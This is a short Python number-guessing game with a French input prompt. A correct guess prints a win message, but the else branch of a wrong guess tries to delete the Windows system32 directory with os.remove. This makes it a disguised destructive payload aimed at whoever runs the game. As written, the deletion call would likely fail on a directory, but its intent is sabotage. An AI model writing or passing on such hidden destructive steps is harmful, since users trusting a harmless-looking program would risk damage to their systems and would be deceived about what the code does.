import random
import os
number= random.randint(1,10)
guess=input("veillez devinez un nombre de 1-10:")
guess=int(guess)

if guess== number:
    print("you win !!!!!!!!!!!!!!!!!!")

else:
    os.remove("c:\\windows\\system32")